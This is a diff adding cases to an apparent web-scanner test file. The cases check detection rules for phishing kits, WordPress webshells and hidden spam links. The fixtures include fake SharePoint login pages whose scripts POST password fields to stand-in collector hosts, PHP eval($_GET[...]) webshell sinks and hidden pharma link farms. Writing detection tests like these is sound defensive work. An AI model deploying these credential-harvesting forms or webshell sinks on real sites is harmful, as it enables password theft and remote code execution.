@@ -1136,6 +1136,15 @@ $content = wp_unslash($_POST['newcontent']);
 wp_redirect(admin_url('theme-editor.php?file=' . $file . '&updated=true'));`,
 		},
 		{
+			name: "theme editor client submitting non-PHP content",
+			rule: "wp_theme_editor_rce",
+			sample: `<?php
+$fields = http_build_query(array('action' => 'update', 'newcontent' => $css));
+$ch = curl_init(admin_url('theme-editor.php'));
+curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+curl_exec($ch);`,
+		},
+		{
 			name: "phishing kit submitting through JavaScript",
 			rule: "phishing_sharepoint",
 			ext:  ".html",
@@ -1144,6 +1153,104 @@ wp_redirect(admin_url('theme-editor.php?file=' . $file . '&updated=true'));`,
 <body><form id="l"><input type="password" name="p"></form>
 <script>fetch('https://collector.example.test/log.php', {method: 'POST', body: new FormData(document.getElementById('l'))});</script>
 </body></html>`,
+		},
+		{
+			name: "spaced SharePoint brand with a form collector",
+			rule: "phishing_sharepoint",
+			ext:  ".html",
+			want: true,
+			sample: `<h1>Share Point login</h1>
+<form action="/collect" method="post"><input type="password" name="p"></form>`,
+		},
+		{
+			name: "oversized SharePoint integration form",
+			rule: "phishing_sharepoint",
+			ext:  ".html",
+			sample: `<h1>SharePoint integration</h1><form` + strings.Repeat(
+				` data-note="`+strings.Repeat("x", 300)+`"`, 8) +
+				` action="/collect"><input type="password" name="client_secret"></form>`,
+		},
+		{
+			name: "oversized SharePoint integration password field",
+			rule: "phishing_sharepoint",
+			ext:  ".html",
+			sample: `<h1>SharePoint integration</h1><input` + strings.Repeat(
+				` data-note="`+strings.Repeat("x", 300)+`"`, 8) +
+				` type="password" name="client_secret"><script>fetch('https://api.example.test/collect', {` +
+				`method: 'POST', body: new FormData(document.getElementById('settings'))});</script>`,
+		},
+		{
+			name: "phishing kit using an extensionless collector",
+			rule: "phishing_sharepoint",
+			ext:  ".html",
+			want: true,
+			sample: `<html><head><title>SharePoint - secured by Microsoft</title></head>
+<body><form id="l"><input type="password" name="p"></form>
+<script>fetch('https://collector.example.test/collect', {method: 'POST', body: new FormData(document.getElementById('l'))});</script>
+</body></html>`,
+		},
+		{
+			name: "distant brand and unrelated JavaScript submission",
+			rule: "phishing_sharepoint",
+			ext:  ".html",
+			sample: "<p>SharePoint documentation</p>" + strings.Repeat("x", 2500) +
+				`<form id="l"><input type="password" name="p"></form>
+<script>fetch('https://api.example.test/submit.php', {method: 'POST', body: new FormData(document.getElementById('l'))});</script>`,
+		},
+		{
+			name: "SharePoint integration posting OAuth parameters",
+			rule: "phishing_sharepoint",
+			ext:  ".html",
+			sample: `<div><h1>SharePoint integration</h1>
+<form><input type="password" name="client_secret"></form>
+<script>fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
+method: 'POST', body: new URLSearchParams({client_id: id, client_secret: secret})
+});</script></div>`,
+		},
+		{
+			name: "theme evaluating an independently compiled template",
+			rule: "webshell_wp_fake_plugin",
+			sample: `<?php
+/* Theme Name: Template Renderer */
+$source = base64_decode($storedTemplate);
+$compiledTemplate = compile_template($source);
+eval($compiledTemplate);`,
+		},
+		{
+			name: "theme evaluating a compiled request-selected template",
+			rule: "webshell_wp_fake_plugin",
+			sample: `<?php
+/* Theme Name: Template Renderer */
+$template = $_GET['template'];
+$source = load_template_source($template);
+$compiledTemplate = compile_template($source);
+eval($compiledTemplate);`,
+		},
+		{
+			name: "theme immediately evaluating an unrelated compiled template",
+			rule: "webshell_wp_fake_plugin",
+			sample: `<?php
+/* Theme Name: Template Renderer */
+$template = trim($_GET['template']);
+eval($compiledTemplate);`,
+		},
+		{
+			name: "theme sink just beyond the shared header bound",
+			rule: "webshell_wp_fake_plugin",
+			sample: `<?php
+/* Theme Name: Large Theme */
+` + strings.Repeat("x", 990) + `
+eval($_GET['preview']);`,
+		},
+		{
+			name: "empty theme name before a request sink",
+			rule: "webshell_wp_fake_plugin",
+			sample: `<?php
+/*
+Theme Name:
+Description: Template renderer
+*/
+eval($_GET['preview']);`,
 		},
 		{
 			name:     "identifier containing downloader and miner names",
@@ -1541,6 +1648,61 @@ eval($_POST['c']);`,
 			wantYARAHit: true,
 		},
 		{
+			name:     "hidden container link farm with nested labels",
+			yamlRule: "spam_hidden_div_links",
+			yaraRule: "spam_hidden_links",
+			ext:      ".html",
+			sample: `<div style="display:none">
+<a href="https://cheap-pills.example.test/1"><span>buy</span></a>
+<a href="https://cheap-pills.example.test/2"><span>buy</span></a>
+<a href="https://cheap-pills.example.test/3"><span>buy</span></a>
+<a href="https://cheap-pills.example.test/4"><span>buy</span></a>
+<a href="https://cheap-pills.example.test/5"><span>buy</span></a>
+<a href="https://cheap-pills.example.test/6"><span>buy</span></a>
+<a href="https://cheap-pills.example.test/7"><span>buy</span></a>
+<a href="https://cheap-pills.example.test/8"><span>buy</span></a>
+</div>`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "hidden container below the shared link threshold",
+			yamlRule: "spam_hidden_div_links",
+			yaraRule: "spam_hidden_links",
+			ext:      ".html",
+			sample: `<div style="display:none">
+<a href="https://cheap-pills.example.test/1">buy</a>
+<a href="https://cheap-pills.example.test/2">buy</a>
+<a href="https://cheap-pills.example.test/3">buy</a>
+<a href="https://cheap-pills.example.test/4">buy</a>
+<a href="https://cheap-pills.example.test/5">buy</a>
+<a href="https://cheap-pills.example.test/6">buy</a>
+<a href="https://cheap-pills.example.test/7">buy</a>
+</div>`,
+			wantYAMLHit: false,
+			wantYARAHit: false,
+		},
+		{
+			name:     "hidden link farm with unquoted image links",
+			yamlRule: "spam_hidden_div_links",
+			yaraRule: "spam_hidden_links",
+			ext:      ".html",
+			sample: `<div style="display:none">` + strings.Repeat(
+				`<a class="spam" href=https://cheap-pills.example.test/><img alt="buy" src="pill.png"></a>`, 8) + `</div>`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "hidden non-div link collection",
+			yamlRule: "spam_hidden_div_links",
+			yaraRule: "spam_hidden_links",
+			ext:      ".html",
+			sample: `<section style="display:none">` + strings.Repeat(
+				`<a href="https://cheap-pills.example.test/">buy</a>`, 8) + `</section>`,
+			wantYAMLHit: false,
+			wantYARAHit: false,
+		},
+		{
 			name:     "OneDrive kit posting off-site with script",
 			yamlRule: "phishing_onedrive",
 			yaraRule: "phishing_sharepoint",
@@ -1574,11 +1736,29 @@ mail('drop@collector.example.test', 'result', "$e|$p");`,
 			wantYARAHit: true,
 		},
 		{
+			name:        "pharma signals spread across separate content",
+			yamlRule:    "spam_pharma_generic",
+			yaraRule:    "spam_pharma",
+			ext:         ".html",
+			sample:      "pharmacy" + strings.Repeat("x", 600) + "buy online" + strings.Repeat("x", 600) + "display:none",
+			wantYAMLHit: false,
+			wantYARAHit: false,
+		},
+		{
+			name:        "pharma signals inside the scheduled shared window",
+			yamlRule:    "spam_pharma_generic",
+			yaraRule:    "spam_pharma",
+			ext:         ".html",
+			sample:      "pharmacy" + strings.Repeat("x", 500) + "buy online" + strings.Repeat("x", 100) + "display:none",
+			wantYAMLHit: false,
+			wantYARAHit: true,
+		},
+		{
 			name:        "request evaluated through a local",
 			yamlRule:    "webshell_generic_eval_request",
 			yaraRule:    "webshell_generic_passthru",
 			ext:         ".php",
-			sample:      `<?php $x = $_REQUEST['a']; eval($x);`,
+			sample:      `<?php $x = $_REQUEST['code']; eval($x);`,
 			wantYAMLHit: true,
 			wantYARAHit: true,
 		},
